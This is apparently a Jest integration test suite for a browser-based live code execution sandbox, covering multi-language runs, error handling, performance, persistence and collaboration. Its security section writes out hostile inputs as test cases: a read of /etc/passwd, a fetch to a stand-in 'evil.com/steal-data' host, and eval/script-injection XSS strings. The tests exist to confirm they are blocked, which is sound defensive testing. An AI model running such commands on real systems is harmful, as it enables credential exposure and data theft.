/**
 * Comprehensive Integration Tests for Live Code Execution System
 * Tests complete workflows, security, performance, and edge cases
 */

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { codeExecutor } from '../index';
import { errorHandler } from '../error-handler';
import { performanceMetrics } from '../performance-metrics';
import { executionManager } from '../execution-controller';
import { codePersistence } from '../code-persistence';
import { collaborationService } from '../collaboration';
import { socialFeatures } from '../social-features';
import { performanceOptimizer } from '../performance-optimizations';

describe('Live Code Execution System - Integration Tests', () => {
  beforeEach(() => {
    // Reset all systems before each test
    jest.clearAllMocks();
    performanceMetrics.clearMetrics();
    performanceOptimizer.clearCache();
  });

  afterEach(() => {
    // Cleanup after each test
    executionManager.cancelAllExecutions();
  });

  describe('End-to-End Code Execution Workflows', () => {
    it('should execute JavaScript code with full workflow', async () => {
      const code = `
        console.log('Hello, World!');
        const result = 2 + 2;
        console.log('Result:', result);
        result;
      `;

      const result = await codeExecutor.execute({
        code,
        language: 'javascript',
        sessionId: 'test-session-1'
      });

      expect(result.success).toBe(true);
      expect(result.output).toContain('Hello, World!');
      expect(result.output).toContain('Result: 4');
      expect(result.executionTime).toBeGreaterThan(0);
    });

    it('should execute Python code with data visualization', async () => {
      const code = `
        import matplotlib.pyplot as plt
        import numpy as np
        
        x = np.linspace(0, 10, 100)
        y = np.sin(x)
        
        plt.figure(figsize=(8, 6))
        plt.plot(x, y)
        plt.title('Sine Wave')
        plt.xlabel('X')
        plt.ylabel('Y')
        plt.show()
        
        print('Plot created successfully')
      `;

      const result = await codeExecutor.execute({
        code,
        language: 'python',
        sessionId: 'test-session-2'
      });

      expect(result.success).toBe(true);
      expect(result.output).toContain('Plot created successfully');
      expect(result.visualOutput).toBeDefined();
      expect(result.metadata?.hasPlots).toBe(true);
    });

    it('should execute SQL queries with sample data', async () => {
      const code = `
        CREATE TABLE users (
          id INTEGER PRIMARY KEY,
          name TEXT NOT NULL,
          email TEXT UNIQUE
        );
        
        INSERT INTO users (name, email) VALUES 
          ('Alice', 'alice@example.com'),
          ('Bob', 'bob@example.com');
        
        SELECT * FROM users ORDER BY name;
      `;

      const result = await codeExecutor.execute({
        code,
        language: 'sql',
        sessionId: 'test-session-3'
      });

      expect(result.success).toBe(true);
      expect(result.visualOutput).toContain('Alice');
      expect(result.visualOutput).toContain('Bob');
    });

    it('should handle HTML/CSS/JS with live preview', async () => {
      const code = `
        <div style="padding: 20px; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); color: white; text-align: center; border-radius: 10px;">
          <h1>Interactive Demo</h1>
          <button onclick="alert('Hello from live preview!')">Click Me</button>
        </div>
      `;

      const result = await codeExecutor.execute({
        code,
        language: 'html',
        sessionId: 'test-session-4'
      });

      expect(result.success).toBe(true);
      expect(result.visualOutput).toContain('Interactive Demo');
      expect(result.visualOutput).toContain('button');
    });
  });

  describe('Error Handling and Recovery', () => {
    it('should handle syntax errors gracefully', async () => {
      const code = `
        console.log("Missing closing quote
        const x = 5;
      `;

      const result = await codeExecutor.execute({
        code,
        language: 'javascript',
        sessionId: 'test-error-1'
      });

      expect(result.success).toBe(false);
      expect(result.error).toBeDefined();
      expect(result.error).toContain('syntax');
    });

    it('should handle runtime errors with suggestions', async () => {
      const code = `
        const obj = null;
        console.log(obj.property);
      `;

      const result = await codeExecutor.execute({
        code,
        language: 'javascript',
        sessionId: 'test-error-2'
      });

      expect(result.success).toBe(false);
      expect(result.error).toBeDefined();
      
      // Test error processing
      const processedError = errorHandler.processError(
        new Error(result.error!),
        {
          language: 'javascript',
          code,
          executionId: 'test-error-2',
          timestamp: Date.now()
        }
      );

      expect(processedError.suggestions.length).toBeGreaterThan(0);
      expect(processedError.userFriendlyMessage).toBeDefined();
    });

    it('should handle timeout scenarios', async () => {
      const code = `
        while (true) {
          console.log('Infinite loop');
        }
      `;

      const result = await codeExecutor.execute({
        code,
        language: 'javascript',
        options: { timeout: 1000 }, // 1 second timeout
        sessionId: 'test-timeout'
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('timeout');
    });

    it('should handle memory limit exceeded', async () => {
      const code = `
        const bigArray = [];
        for (let i = 0; i < 10000000; i++) {
          bigArray.push(new Array(1000).fill(i));
        }
      `;

      const result = await codeExecutor.execute({
        code,
        language: 'javascript',
        options: { memoryLimit: 10 * 1024 * 1024 }, // 10MB limit
        sessionId: 'test-memory'
      });

      // Should either succeed with warning or fail with memory error
      if (!result.success) {
        expect(result.error).toContain('memory');
      }
    });
  });

  describe('Security and Sandboxing', () => {
    it('should block file system access attempts', async () => {
      const code = `
        const fs = require('fs');
        fs.readFileSync('/etc/passwd');
      `;

      const result = await codeExecutor.execute({
        code,
        language: 'javascript',
        sessionId: 'test-security-1'
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('require');
    });

    it('should block network requests to external domains', async () => {
      const code = `
        fetch('https://evil.com/steal-data')
          .then(response => response.text())
          .then(data => console.log(data));
      `;

      const result = await codeExecutor.execute({
        code,
        language: 'javascript',
        sessionId: 'test-security-2'
      });

      // Should either block the request or fail
      if (!result.success) {
        expect(result.error).toMatch(/network|fetch|blocked/i);
      }
    });

    it('should prevent code injection attacks', async () => {
      const maliciousCode = `
        eval('alert("XSS Attack")');
        document.body.innerHTML = '<script>alert("Injected")</script>';
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'javascript',
        sessionId: 'test-security-3'
      });

      // Should execute in sandboxed environment
      expect(result).toBeDefined();
    });

    it('should isolate execution contexts', async () => {
      // First execution
      await codeExecutor.execute({
        code: 'const secret = "sensitive data";',
        language: 'javascript',
        sessionId: 'test-isolation-1'
      });

      // Second execution should not access first's variables
      const result = await codeExecutor.execute({
        code: 'console.log(typeof secret);',
        language: 'javascript',
        sessionId: 'test-isolation-2'
      });

      expect(result.success).toBe(true);
      expect(result.output).toContain('undefined');
    });
  });

  describe('Performance and Optimization', () => {
    it('should cache compiled code for repeated executions', async () => {
      const code = 'console.log("Performance test");';

      // First execution
      const start1 = Date.now();
      const result1 = await codeExecutor.execute({
        code,
        language: 'javascript',
        sessionId: 'test-perf-1'
      });
      const time1 = Date.now() - start1;

      // Second execution (should be faster due to caching)
      const start2 = Date.now();
      const result2 = await codeExecutor.execute({
        code,
        language: 'javascript',
        sessionId: 'test-perf-2'
      });
      const time2 = Date.now() - start2;

      expect(result1.success).toBe(true);
      expect(result2.success).toBe(true);
      // Second execution should be faster (allowing for some variance)
      expect(time2).toBeLessThanOrEqual(time1 * 1.5);
    });

    it('should handle concurrent executions efficiently', async () => {
      const executions = Array.from({ length: 5 }, (_, i) => 
        codeExecutor.execute({
          code: `console.log("Concurrent execution ${i}");`,
          language: 'javascript',
          sessionId: `test-concurrent-${i}`
        })
      );

      const results = await Promise.all(executions);
      
      results.forEach((result, i) => {
        expect(result.success).toBe(true);
        expect(result.output).toContain(`Concurrent execution ${i}`);
      });
    });

    it('should track performance metrics', async () => {
      const executionId = 'test-metrics';
      
      performanceMetrics.startExecution(executionId, 'javascript', 100);
      
      await codeExecutor.execute({
        code: 'console.log("Metrics test");',
        language: 'javascript',
        sessionId: executionId
      });

      const endResult = performanceMetrics.endExecution(executionId, true, 50);
      
      expect(endResult).toBeDefined();
      expect(endResult?.success).toBe(true);
      expect(endResult?.duration).toBeGreaterThan(0);
    });
  });

  describe('Persistence and Session Management', () => {
    it('should save and retrieve code snippets', async () => {
      const snippetData = {
        title: 'Test Snippet',
        description: 'A test code snippet',
        code: 'console.log("Hello from saved snippet");',
        language: 'javascript' as const,
        isPublic: true,
        tags: ['test', 'example'],
        metadata: {
          codeSize: 100,
          complexity: 'beginner' as const,
          category: 'test'
        }
      };

      const snippetId = await codePersistence.saveCodeSnippet(snippetData);
      expect(snippetId).toBeDefined();

      const retrieved = await codePersistence.getCodeSnippet(snippetId);
      expect(retrieved).toBeDefined();
      expect(retrieved?.title).toBe(snippetData.title);
      expect(retrieved?.code).toBe(snippetData.code);
    });

    it('should manage execution sessions', async () => {
      const sessionData = {
        code: 'console.log("Session test");',
        language: 'javascript' as const,
        results: [],
        isTemporary: false
      };

      const sessionId = await codePersistence.createSession(sessionData);
      expect(sessionId).toBeDefined();

      const session = await codePersistence.getSession(sessionId);
      expect(session).toBeDefined();
      expect(session?.code).toBe(sessionData.code);
    });

    it('should handle code forking', async () => {
      // Create original snippet
      const originalId = await codePersistence.saveCodeSnippet({
        title: 'Original Snippet',
        description: 'Original code',
        code: 'console.log("Original");',
        language: 'javascript',
        isPublic: true,
        tags: ['original'],
        metadata: {
          codeSize: 50,
          complexity: 'beginner',
          category: 'test'
        }
      });

      // Fork the snippet
      const forkId = await codePersistence.forkCodeSnippet(originalId, 'Forked Snippet');
      expect(forkId).toBeDefined();

      const forked = await codePersistence.getCodeSnippet(forkId);
      expect(forked).toBeDefined();
      expect(forked?.parentId).toBe(originalId);
      expect(forked?.title).toBe('Forked Snippet');
    });
  });

  describe('Collaboration Features', () => {
    it('should create and manage shareable links', async () => {
      // Create a snippet first
      const snippetId = await codePersistence.saveCodeSnippet({
        title: 'Shareable Snippet',
        description: 'A snippet to share',
        code: 'console.log("Shared code");',
        language: 'javascript',
        isPublic: true,
        tags: ['shared'],
        metadata: {
          codeSize: 50,
          complexity: 'beginner',
          category: 'test'
        }
      });

      const shareLink = await collaborationService.createShareableLink(snippetId, {
        accessType: 'public',
        allowFork: true,
        allowEdit: false
      });

      expect(shareLink).toBeDefined();
      expect(shareLink.snippetId).toBe(snippetId);
      expect(shareLink.url).toContain(shareLink.id);
    });

    it('should handle collaboration sessions', async () => {
      const snippetId = await codePersistence.saveCodeSnippet({
        title: 'Collaborative Snippet',
        description: 'For collaboration',
        code: 'console.log("Collaborate");',
        language: 'javascript',
        isPublic: true,
        tags: ['collab'],
        metadata: {
          codeSize: 50,
          complexity: 'beginner',
          category: 'test'
        }
      });

      const sessionId = await collaborationService.startCollaborationSession(snippetId, {
        maxParticipants: 5,
        allowAnonymous: true,
        requireApproval: false
      });

      expect(sessionId).toBeDefined();

      const joined = await collaborationService.joinCollaborationSession(sessionId, {
        userId: 'test-user',
        name: 'Test User',
        role: 'editor'
      });

      expect(joined).toBe(true);
    });
  });

  describe('Social Features Integration', () => {
    it('should create and manage user profiles', async () => {
      const profileData = {
        id: 'test-user-1',
        username: 'testuser',
        displayName: 'Test User',
        email: 'test@example.com',
        bio: 'A test user',
        preferences: {
          publicProfile: true,
          emailNotifications: true,
          showActivity: true,
          preferredLanguages: ['javascript', 'python'] as const
        }
      };

      const userId = await socialFeatures.createUserProfile(profileData);
      expect(userId).toBe(profileData.id);

      const profile = await socialFeatures.getUserProfile(userId);
      expect(profile).toBeDefined();
      expect(profile?.username).toBe(profileData.username);
    });

    it('should handle code challenges', async () => {
      const challengeData = {
        title: 'Test Challenge',
        description: 'A test coding challenge',
        difficulty: 'beginner' as const,
        language: 'javascript' as const,
        category: 'algorithms',
        tags: ['test', 'beginner'],
        starterCode: 'function solve() {\n  // Your code here\n}',
        testCases: [{
          id: 'test1',
          input: '5',
          expectedOutput: '25',
          description: 'Square of 5',
          isHidden: false,
          weight: 1
        }],
        hints: ['Think about mathematical operations'],
        createdBy: 'test-user-1',
        rewards: {
          points: 100,
          badges: ['first_challenge']
        }
      };

      const challengeId = await socialFeatures.createChallenge(challengeData);
      expect(challengeId).toBeDefined();

      const challenge = await socialFeatures.getChallenge(challengeId);
      expect(challenge).toBeDefined();
      expect(challenge?.title).toBe(challengeData.title);
    });
  });

  describe('Edge Cases and Stress Tests', () => {
    it('should handle very large code inputs', async () => {
      const largeCode = 'console.log("test");'.repeat(10000);

      const result = await codeExecutor.execute({
        code: largeCode,
        language: 'javascript',
        sessionId: 'test-large-code'
      });

      // Should either succeed or fail gracefully
      expect(result).toBeDefined();
      if (!result.success) {
        expect(result.error).toBeDefined();
      }
    });

    it('should handle empty code input', async () => {
      const result = await codeExecutor.execute({
        code: '',
        language: 'javascript',
        sessionId: 'test-empty-code'
      });

      expect(result).toBeDefined();
      // Should handle empty code gracefully
    });

    it('should handle special characters and unicode', async () => {
      const code = `
        console.log("Unicode test: 🚀 🎉 🔥");
        console.log("Special chars: @#$%^&*()");
        console.log("Accents: café, naïve, résumé");
      `;

      const result = await codeExecutor.execute({
        code,
        language: 'javascript',
        sessionId: 'test-unicode'
      });

      expect(result.success).toBe(true);
      expect(result.output).toContain('🚀');
      expect(result.output).toContain('café');
    });

    it('should handle rapid successive executions', async () => {
      const rapidExecutions = Array.from({ length: 10 }, (_, i) => 
        codeExecutor.execute({
          code: `console.log("Rapid ${i}");`,
          language: 'javascript',
          sessionId: `test-rapid-${i}`
        })
      );

      const results = await Promise.allSettled(rapidExecutions);
      
      // Most should succeed, some might be queued or rate-limited
      const successful = results.filter(r => r.status === 'fulfilled').length;
      expect(successful).toBeGreaterThan(5);
    });
  });

  describe('Cross-Language Compatibility', () => {
    it('should maintain consistent API across languages', async () => {
      const testCases = [
        { language: 'javascript', code: 'console.log("JS test");' },
        { language: 'python', code: 'print("Python test")' },
        { language: 'sql', code: 'SELECT "SQL test" as message;' }
      ];

      for (const testCase of testCases) {
        const result = await codeExecutor.execute({
          code: testCase.code,
          language: testCase.language as any,
          sessionId: `test-${testCase.language}`
        });

        expect(result).toBeDefined();
        expect(result).toHaveProperty('success');
        expect(result).toHaveProperty('executionTime');
        expect(typeof result.success).toBe('boolean');
        expect(typeof result.executionTime).toBe('number');
      }
    });
  });
});

describe('Performance Benchmarks', () => {
  it('should execute JavaScript within performance thresholds', async () => {
    const start = Date.now();
    
    const result = await codeExecutor.execute({
      code: 'console.log("Performance test");',
      language: 'javascript',
      sessionId: 'perf-test-js'
    });
    
    const duration = Date.now() - start;
    
    expect(result.success).toBe(true);
    expect(duration).toBeLessThan(5000); // Should complete within 5 seconds
  });

  it('should handle memory efficiently', async () => {
    const initialMemory = process.memoryUsage().heapUsed;
    
    // Execute multiple operations
    for (let i = 0; i < 10; i++) {
      await codeExecutor.execute({
        code: `console.log("Memory test ${i}");`,
        language: 'javascript',
        sessionId: `memory-test-${i}`
      });
    }
    
    const finalMemory = process.memoryUsage().heapUsed;
    const memoryIncrease = finalMemory - initialMemory;
    
    // Memory increase should be reasonable (less than 50MB)
    expect(memoryIncrease).toBeLessThan(50 * 1024 * 1024);
  });
});

describe('Error Recovery and Resilience', () => {
  it('should recover from engine crashes', async () => {
    // Simulate engine crash scenario
    const crashingCode = `
      throw new Error("Simulated engine crash");
    `;

    const result1 = await codeExecutor.execute({
      code: crashingCode,
      language: 'javascript',
      sessionId: 'crash-test-1'
    });

    expect(result1.success).toBe(false);

    // Next execution should work normally
    const result2 = await codeExecutor.execute({
      code: 'console.log("Recovery test");',
      language: 'javascript',
      sessionId: 'crash-test-2'
    });

    expect(result2.success).toBe(true);
  });

  it('should handle network failures gracefully', async () => {
    // Test offline scenario
    const originalOnline = navigator.onLine;
    Object.defineProperty(navigator, 'onLine', {
      writable: true,
      value: false
    });

    const result = await codeExecutor.execute({
      code: 'console.log("Offline test");',
      language: 'javascript',
      sessionId: 'offline-test'
    });

    // Should still work for local execution
    expect(result).toBeDefined();

    // Restore online status
    Object.defineProperty(navigator, 'onLine', {
      value: originalOnline
    });
  });
});